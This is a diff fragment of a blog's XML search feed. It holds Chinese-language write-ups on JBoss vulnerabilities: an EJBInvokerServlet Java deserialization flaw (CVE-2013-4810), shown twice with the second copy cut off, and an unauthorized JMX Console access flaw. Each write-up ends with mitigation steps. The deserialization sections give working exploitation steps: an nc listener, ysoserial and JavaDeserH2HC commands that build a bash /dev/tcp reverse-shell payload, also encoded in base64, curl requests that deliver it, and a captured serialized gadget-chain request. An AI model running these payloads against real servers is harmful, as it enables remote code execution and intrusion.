+ <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>升级JBoss版本</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web服务器漏洞</category>
+        <category>常规漏洞</category>
+        <category>JBoss</category>
+        <category>反序列化漏洞</category>
+      </categories>
+      <tags>
+        <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss EJBInvokerServlet 反序列化漏洞 - CVE-2013-4810</title>
+    <url>//5ced298ab0a9.html</url>
+    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>默认端口：8080</p>
+<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>由于<code>JBoss</code>中<code>invoker/EJBInvokerServlet</code>路径对外开放，</p>
+<p><code>EJBInvokerServlet</code> 利用的是 <code>org.jboss.invocation.MarshalledValue</code> 进行的反序列化操作</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
+<p>&gt;= JBoss 6.x</p>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
+<p>在官网下载相应的JBoss版本</p>
+<p>配置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
+
+<p>外网访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
+<ol>
+<li>JBoss漏洞检测工具下载</li>
+</ol>
+<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
+<ol start="2">
+<li>先探测是否具有JBoss服务</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
+
+<p>根据HTTP头部</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问如下地址</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/EJBInvokerServlet</span><br></pre></td></tr></table></figure>
+
+<p>如果提示下载信息，则说明存在此漏洞</p>
+<p>监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p>下载JavaDeserH2HC工具</p>
+<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以使用<code>ysoserial.jar</code>工具</p>
+<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>
+
+<p>HTTP头部抓包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/EJBInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li><p>删除<code>http-invoker.sar</code>组件</p>
+</li>
+<li><p>设置<code>http-invoker</code></p>
+ <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>升级JBoss版本</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web服务器漏洞</category>
+        <category>常规漏洞</category>
+        <category>JBoss</category>
+        <category>反序列化漏洞</category>
+      </categories>
+      <tags>
+        <tag>反序列化漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss JMX Console未授权访问漏洞</title>
+    <url>//8e92a3ee39a7.html</url>
+    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>默认端口：8080</p>
+<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>
+<p>由于 JBoss Web Server 缺少默认身份验证强制执行，因此也可以完全控制应用程序。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
+<p>全版本</p>
+<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
+<p>在官网下载相应的JBoss版本</p>
+<p>配置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
+
+<p>外网访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
+<ol>
+<li>JBoss漏洞检测工具下载</li>
+</ol>
+<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
+<ol start="2">
+<li>先探测是否具有JBoss服务</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
+
+<p>根据HTTP头部</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问如下地址</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor</span><br></pre></td></tr></table></figure>
+
+<p>如果可以成功访问，证明存在此漏洞</p>
+<p>该页面为JBoss控制台，暴漏在公网存在多处漏洞</p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
+<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web服务器漏洞</category>
+        <category>常规漏洞</category>
+        <category>JBoss</category>
+        <category>未授权访问漏洞</category>
+      </categories>
+      <tags>
+        <tag>未授权访问漏洞</tag>
+        <tag>访问控制错误漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JBoss DeploymentFileRepository目录遍历漏洞 - CVE-2006-5750</title>
     <url>//238965db204a.html</url>
     <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
@@ -5720,160 +5991,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JBoss EJBInvokerServlet 反序列化漏洞 - CVE-2013-4810</title>
-    <url>//5ced298ab0a9.html</url>
-    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
-<p>默认端口：8080</p>
-<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>由于<code>JBoss</code>中<code>invoker/EJBInvokerServlet</code>路径对外开放，</p>
-<p><code>EJBInvokerServlet</code> 利用的是 <code>org.jboss.invocation.MarshalledValue</code> 进行的反序列化操作</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
-<p>&gt;= JBoss 6.x</p>
-<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
-<p>在官网下载相应的JBoss版本</p>
-<p>配置环境变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>
-
-<p>外网访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>
-
-<p>启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
-<ol>
-<li>JBoss漏洞检测工具下载</li>
-</ol>
-<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
-<ol start="2">
-<li>先探测是否具有JBoss服务</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>
-
-<p>根据HTTP头部</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>
-
-
-
-<p>访问如下地址</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/EJBInvokerServlet</span><br></pre></td></tr></table></figure>
-
-<p>如果提示下载信息，则说明存在此漏洞</p>
-<p>监听端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
-
-<p>下载JavaDeserH2HC工具</p>
-<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以使用<code>ysoserial.jar</code>工具</p>
-<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/EJBInvokerServlet --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>
-
-<p>HTTP头部抓包</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/EJBInvokerServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span 